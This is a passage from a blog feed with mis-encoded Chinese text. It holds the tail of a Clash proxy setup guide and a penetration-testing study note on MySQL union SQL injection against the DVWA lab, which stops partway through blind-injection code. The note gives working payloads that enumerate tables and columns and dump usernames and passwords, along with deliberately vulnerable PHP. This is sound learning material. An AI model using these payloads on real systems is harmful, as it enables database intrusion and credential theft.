class="string">&#x27;http_proxy|https_proxy&#x27;</span></span><br><span class="line">http_proxy=http://127.0.0.1:7890</span><br><span class="line">https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ­¥é„¹å¦‚æœæ­£å¸¸ï¼Œè¯´æ˜æœåŠ¡clashç¨‹åºå¯åŠ¨æˆåŠŸï¼Œç°åœ¨å°±å¯ä»¥ä½“éªŒé«˜é€Ÿä¸‹è½½githubèµ„æºäº†ã€‚</p><br><h2 id="é‡å¯ç¨‹åº"><a href="#é‡å¯ç¨‹åº" class="headerlink" title="é‡å¯ç¨‹åº"></a>é‡å¯ç¨‹åº</h2><p>å¦‚æœéœ€è¦å¯¹Clashé…ç½®è¿›è¡Œä¿®æ”¹ï¼Œè¯·ä¿®æ”¹ <code>conf/config.yaml</code> æ–‡ä»¶ã€‚ç„¶åè¿è¡Œ <code>restart.sh</code> è„šæœ¬è¿›è¡Œé‡å¯ã€‚</p><blockquote><p><strong>æ³¨æ„ï¼š</strong><br>é‡å¯è„šæœ¬ <code>restart.sh</code> ä¸ä¼šæ›´æ–°è®¢é˜…ä¿¡æ¯ã€‚</p></blockquote><br><h2 id="åœæ­¢ç¨‹åº"><a href="#åœæ­¢ç¨‹åº" class="headerlink" title="åœæ­¢ç¨‹åº"></a>åœæ­¢ç¨‹åº</h2><ul><li>è¿›å…¥é¡¹ç›®ç›®å½•</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> clash-for-linux</span><br></pre></td></tr></table></figure><ul><li>å…³é—­æœåŠ¡</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bash shutdown.sh</span><br><span class="line"></span><br><span class="line">æœåŠ¡å…³é—­æˆåŠŸï¼Œè¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å…³é—­ç³»ç»Ÿä»£ç†ï¼šproxy_off</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxy_off</span><br></pre></td></tr></table></figure><p>ç„¶åæ£€æŸ¥ç¨‹åºç«¯å£ã€è¿›ç¨‹ä»¥åŠç¯å¢ƒå˜é‡<code>http_proxy|https_proxy</code>ï¼Œè‹¥éƒ½æ²¡åˆ™è¯´æ˜æœåŠ¡æ­£å¸¸å…³é—­ã€‚</p><br><h2 id="Clash-Dashboard"><a href="#Clash-Dashboard" class="headerlink" title="Clash Dashboard"></a>Clash Dashboard</h2><ul><li>è®¿é—® Clash Dashboard</li></ul><p>é€šè¿‡æµè§ˆå™¨è®¿é—® <code>start.sh</code> æ‰§è¡ŒæˆåŠŸåè¾“å‡ºçš„åœ°å€ï¼Œä¾‹å¦‚ï¼š<a href="http://192.168.0.1:9090/ui">http://192.168.0.1:9090/ui</a></p><ul><li>ç™»å½•ç®¡ç†ç•Œé¢</li></ul><p>åœ¨<code>API Base URL</code>ä¸€æ ä¸­è¾“å…¥ï¼šhttp:&#x2F;&#x2F;&lt;ip&gt;:9090 ï¼Œåœ¨<code>Secret(optional)</code>ä¸€æ ä¸­è¾“å…¥å¯åŠ¨æˆåŠŸåè¾“å‡ºçš„Secretã€‚</p><p>ç‚¹å‡»Addå¹¶é€‰æ‹©åˆšåˆšè¾“å…¥çš„ç®¡ç†ç•Œé¢åœ°å€ï¼Œä¹‹åä¾¿å¯åœ¨æµè§ˆå™¨ä¸Šè¿›è¡Œä¸€äº›é…ç½®ã€‚</p><ul><li>æ›´å¤šæ•™ç¨‹</li></ul><p>æ­¤ Clash Dashboard ä½¿ç”¨çš„æ˜¯<a href="https://github.com/haishanh/yacd">yacd</a>é¡¹ç›®ï¼Œè¯¦ç»†ä½¿ç”¨æ–¹æ³•è¯·ç§»æ­¥åˆ°yacdä¸ŠæŸ¥è¯¢ã€‚</p><br><h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><ol><li><p>éƒ¨åˆ†Linuxç³»ç»Ÿé»˜è®¤çš„ shell <code>/bin/sh</code> è¢«æ›´æ”¹ä¸º <code>dash</code>ï¼Œè¿è¡Œè„šæœ¬ä¼šå‡ºç°æŠ¥é”™ï¼ˆæŠ¥é”™å†…å®¹ä¸€èˆ¬ä¼šæœ‰ <code>-en [ OK ]</code>ï¼‰ã€‚å»ºè®®ä½¿ç”¨ <code>bash xxx.sh</code> è¿è¡Œè„šæœ¬ã€‚</p></li><li><p>éƒ¨åˆ†ç”¨æˆ·åœ¨UIç•Œé¢æ‰¾ä¸åˆ°ä»£ç†èŠ‚ç‚¹ï¼ŒåŸºæœ¬ä¸Šæ˜¯å› ä¸ºå‚å•†æä¾›çš„clashé…ç½®æ–‡ä»¶æ˜¯ç»è¿‡base64ç¼–ç çš„ï¼Œä¸”é…ç½®æ–‡ä»¶æ ¼å¼ä¸ç¬¦åˆclashé…ç½®æ ‡å‡†ã€‚</p><p>ç›®å‰æ­¤é¡¹ç›®å·²é›†æˆè‡ªåŠ¨è¯†åˆ«å’Œè½¬æ¢clashé…ç½®æ–‡ä»¶çš„åŠŸèƒ½ã€‚å¦‚æœä¾ç„¶æ— æ³•ä½¿ç”¨ï¼Œåˆ™éœ€è¦é€šè¿‡è‡ªå»ºæˆ–è€…ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆä¸æ¨èï¼Œæœ‰æ³„éœ²é£é™©ï¼‰å¯¹è®¢é˜…åœ°å€è½¬æ¢ã€‚</p></li><li><p>ç¨‹åºæ—¥å¿—ä¸­å‡ºç°<code>error: unsupported rule type RULE-SET</code>æŠ¥é”™ï¼Œè§£å†³æ–¹æ³•æŸ¥çœ‹å®˜æ–¹<a href="https://github.com/Dreamacro/clash/wiki/FAQ#error-unsupported-rule-type-rule-set">WIKI</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="proxy" scheme="http://blog.ioimp.top/categories/proxy/"/>
    
    
    <category term="clash" scheme="http://blog.ioimp.top/tags/clash/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€å­¦ä¹ è®°å½•OS</title>
    <link href="http://blog.ioimp.top/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/"/>
    <id>http://blog.ioimp.top/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/</id>
    <published>2022-12-25T14:58:29.000Z</published>
    <updated>2023-08-04T01:05:35.055Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysqlé»˜è®¤è¡¨ç›¸å…³çŸ¥è¯†"><a href="#mysqlé»˜è®¤è¡¨ç›¸å…³çŸ¥è¯†" class="headerlink" title="mysqlé»˜è®¤è¡¨ç›¸å…³çŸ¥è¯†"></a>mysqlé»˜è®¤è¡¨ç›¸å…³çŸ¥è¯†</h2><p>åœ¨ mysql5 ç‰ˆæœ¬ä»¥åï¼Œmysql é»˜è®¤åœ¨æ•°æ®åº“ä¸­å­˜æ”¾åœ¨ä¸€ä¸ªå« <code>infomation_schema</code> é‡Œé¢ è¿™ä¸ªåº“é‡Œé¢æœ‰å¾ˆå¤šè¡¨ é‡ç‚¹æ˜¯è¿™ä¸‰ä¸ªè¡¨ <code>columns ã€tablesã€SCHEMATA</code> è¡¨å­—æ®µ CHEMA_NAME è®°å½•ç€åº“çš„ä¿¡æ¯</p><p>columns å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€æ ‡åå’Œå­—æ®µåã€‚</p><h2 id="unionè”åˆæ³¨å…¥æ”»å‡»åŸç†"><a href="#unionè”åˆæ³¨å…¥æ”»å‡»åŸç†" class="headerlink" title="unionè”åˆæ³¨å…¥æ”»å‡»åŸç†"></a>unionè”åˆæ³¨å…¥æ”»å‡»åŸç†</h2><blockquote><p>æ­¥éª¤ä¸€ï¼šè”åˆä¸¤è¡¨</p><p>â€‹1.unionè¯­å¥è¦æ±‚å­—æ®µæ•°ä¸€æ ·æ‰å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè¿›è¡Œå­—æ®µåˆ¤æ–­</p><p>å¸¸è§æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 order by 8</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å‡ºå­—æ®µæ•°ä¸º8</p><p>ç„¶åé€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8</span><br></pre></td></tr></table></figure><p>è¿›è¡Œè”åˆæŸ¥è¯¢</p></blockquote><p>è”åˆæŸ¥è¯¢åé¢çš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user()</span><br></pre></td></tr></table></figure><p>selectåé¢çš„æ•°å­—å¯ä»¥æ›¿æ¢æˆå­—æ®µçš„åç§°æˆ–è€…å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- æ›¿æ¢æˆmysqlå†…ç½®å‡½æ•°</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- æ›¿æ¢æˆmysqlæ•°æ®åº“é‡Œçš„å­—æ®µ</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users</span><br><span class="line">-- ä¹Ÿå¯ä»¥åœ¨è¯­å¥åé¢åŠ ä¸Šlimité™å®šæ˜¾ç¤ºçš„è¡Œæ•°</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1</span><br><span class="line"></span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- å¦‚æœä¸æƒ³è¦ç¬¬ä¸€ä¸ªè¡¨é‡Œçš„æ•°æ® å¯ä»¥æŠŠ1æ¢æˆ-1 å› ä¸ºé»˜è®¤è´Ÿæ•°å°±è¡¨ç¤ºä¸å­˜åœ¨çš„</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1</span><br></pre></td></tr></table></figure><h2 id="unionè”åˆæ³¨å…¥æ”»å‡»åˆ†æ"><a href="#unionè”åˆæ³¨å…¥æ”»å‡»åˆ†æ" class="headerlink" title="unionè”åˆæ³¨å…¥æ”»å‡»åˆ†æ"></a>unionè”åˆæ³¨å…¥æ”»å‡»åˆ†æ</h2><h3 id="åˆ†æè”åˆæ³¨å…¥æ¼æ´ä»£ç "><a href="#åˆ†æè”åˆæ³¨å…¥æ¼æ´ä»£ç " class="headerlink" title="åˆ†æè”åˆæ³¨å…¥æ¼æ´ä»£ç "></a>åˆ†æè”åˆæ³¨å…¥æ¼æ´ä»£ç </h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆåˆ†ææ„æˆè”åˆæ³¨å…¥æ”»å‡»çš„sqlæ³¨å…¥ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#è¿™é‡Œä¼ å…¥çš„å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç›´æ¥è¿›å…¥sqlè¯­å¥</span></span><br><span class="line">    <span class="comment">#ä»è¿™é‡Œå¯ä»¥åˆ¤æ–­å‡ºidæ˜¯å­—ç¬¦ä¸²ç±»å‹ æ‰€ä»¥åœ¨è¿›è¡Œsqlæ³¨å…¥æ£€æµ‹çš„æ—¶å€™è¦åŒ¹é…å­—ç¬¦</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="comment">//æ˜¾ç¤ºæŸ¥è¯¢æˆåŠŸåçš„å†…å®¹</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨è”åˆæ³¨å…¥"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨è”åˆæ³¨å…¥" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨è”åˆæ³¨å…¥"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨è”åˆæ³¨å…¥</h3><p>â€‹æˆ‘ä»¬å…ˆé€šè¿‡é¶åœºæŸ¥è¯¢id å¦‚æœåœ¨æˆ‘ä»¬æ²¡è¿›è¡Œæºä»£ç åˆ†æçš„åŸºç¡€ä¸Š æˆ‘ä»¬é¦–å…ˆéœ€è¦è¿›è¡Œæ•°å­—å’Œå­—ç¬¦ä¸²åˆ¤æ–­ <code>1</code> å’Œ<code>1â€˜</code> åˆ¤æ–­å‡ºä¼ å…¥æ•°æ®æ˜¯å­—ç¬¦ä¸²å‹ å³å­˜åœ¨æ³¨å…¥æ¼æ´</p><p>â€‹è¾“å…¥ 1â€™and â€˜1â€™&#x3D;â€™1 é¡µé¢è¿”å›ç”¨æˆ·ä¿¡æ¯ 1â€™and â€˜1â€™&#x3D;â€™2 é¡µé¢è¿”å›ä¸ä¸€æ ·çš„ä¿¡æ¯ã€‚åŸºæœ¬å¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´.</p><h3 id="åˆ¤æ–­å­—æ®µæ•°"><a href="#åˆ¤æ–­å­—æ®µæ•°" class="headerlink" title="åˆ¤æ–­å­—æ®µæ•°"></a>åˆ¤æ–­å­—æ®µæ•°</h3><p>â€‹ä½¿ç”¨è¯­å¥<code>order by</code>ç¡®å®šå½“å‰è¡¨çš„å­—ç¬¦æ•°</p><p>â€‹order by 1 å¦‚æœé¡µé¢è¿”å›æ­£å¸¸ å­—æ®µæ•°ä¸å°‘äº 1,order by 2 ä¸å°‘äº 2ï¼Œä¸€ç›´å¦‚æ­¤ç±»æ¨ç›´åˆ°é¡µé¢å‡ºé”™ã€‚æ­£ç¡®çš„å­—æ®µæ•°æ˜¯å‡ºé”™æ•°å­—å‡å°‘ 1</p><p>å…¬å¼ order by n-1</p><p>1â€™ order by 1â€“+ æ­£å¸¸</p><p>1â€™ order by 2â€“+ æ­£å¸¸</p><p>1â€™ order by 3â€“+ å‡ºé”™</p><p>æ­£å¸¸é¡µé¢ </p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯"></a>è”åˆæŸ¥è¯¢æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯</h3><p>â€‹è·Ÿå‰é¢å’±ä»¬åˆ†æçš„ä¸€æ ·ï¼Œè¿™é‡Œåªæ˜¯æŠŠæŸ¥è¯¢çš„æ•°æ®æ›¿æ¢æˆäº†è”åˆæŸ¥è¯¢çš„è¯­å¥ ç„¶åè¿›è¡Œè·å–å¦ä¸€ä¸ªè¡¨çš„å­—æ®µæˆ–è€…å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select user,password from users-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>group_concatï¼ˆï¼‰</code>å‡½æ•°æ¥è¿›è¡Œåˆ†ç»„æ‰“å°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3A,version())-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232149753-1158385166.png"></p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information-schema"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information-schema" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schema"></a>è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schema</h3><p>â€‹</p><p>åœ¨é»‘ç›’æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯ä¸çŸ¥é“å½“å‰æ•°æ®åº“é‡Œéƒ½æœ‰å“ªäº›è¡¨çš„æ‰€ä»¥æˆ‘ä»¬å…ˆä»mysqlçš„information_schemaå…¥æ‰‹è¿›è¡Œè¡¨çš„æŸ¥è¯¢</p><p>ç¬¬ä¸€ä¸ªè¡¨ï¼š</p><p>è¿™é‡Œçš„<code>databaseï¼ˆï¼‰</code>å‡½æ•°æ˜¯æ¥é™å®šæŸ¥è¯¢çš„è¡¨æ˜¯å½“å‰è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- </span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªè¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- </span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸¤ä¸ªè¡¨çš„æŸ¥è¯¢æˆ‘ä»¬çŸ¥é“dvwaä¸­å«æœ‰çš„è¡¨ä¸º<code>guestbook</code> å’Œ<code>users</code></p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information-schemaè·å–å­—æ®µ"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information-schemaè·å–å­—æ®µ" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schemaè·å–å­—æ®µ"></a>è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schemaè·å–å­—æ®µ</h3><p>æˆ‘ä»¬çŸ¥é“æ•°æ®åº“çš„å­—æ®µéƒ½å­˜åœ¨mysqlé»˜è®¤å†…ç½®åº“information_schemaçš„columnsé‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦è·å–å½“å‰æ•°æ®åº“çš„å­—æ®µåå­—æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><p>è·å–usersè¡¨é‡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µåå­— id </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- </span><br><span class="line">-- æ³¨æ„è¿™é‡Œä¸€å®šè¦åŠ ä¸Šé™å®š å› ä¸ºä½ æ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯ä¸€ä¸ªå­—æ®µå¦‚æœä¸åŠ ä¼šæŠ¥é”™</span><br><span class="line">-- Subquery returns more than 1 row</span><br></pre></td></tr></table></figure><p>è·å–ç¬¬äºŒä¸ªå­—æ®µåå­— password </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- </span><br></pre></td></tr></table></figure><p>è·å–ç¬¬ä¸‰ä¸ªå­—æ®µåå­—  email</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- </span><br></pre></td></tr></table></figure><p>è·å–ç¬¬å››ä¸ªå­—æ®µåå­— secret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- </span><br></pre></td></tr></table></figure><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p><h3 id="é€šè¿‡è”åˆæŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹"><a href="#é€šè¿‡è”åˆæŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹" class="headerlink" title="é€šè¿‡è”åˆæŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹"></a>é€šè¿‡è”åˆæŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹</h3><p>â€‹é€šè¿‡ä»¥ä¸Šæ“ä½œæˆ‘ä»¬å·²ç»è·å–äº†å½“å‰æ•°æ®åº“çš„åº“åã€è¡¨åã€å­—æ®µ</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢è¯­å¥è·å–è¡¨é‡Œé¢çš„å†…å®¹äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- </span><br></pre></td></tr></table></figure><h2 id="booleanå¸ƒå°”å‹ç›²æ³¨å…¥"><a href="#booleanå¸ƒå°”å‹ç›²æ³¨å…¥" class="headerlink" title="booleanå¸ƒå°”å‹ç›²æ³¨å…¥"></a>booleanå¸ƒå°”å‹ç›²æ³¨å…¥</h2><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#idä¸ºå­—ç¬¦ä¸²å‹ getæ¥æ”¶idå‚æ•°</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ 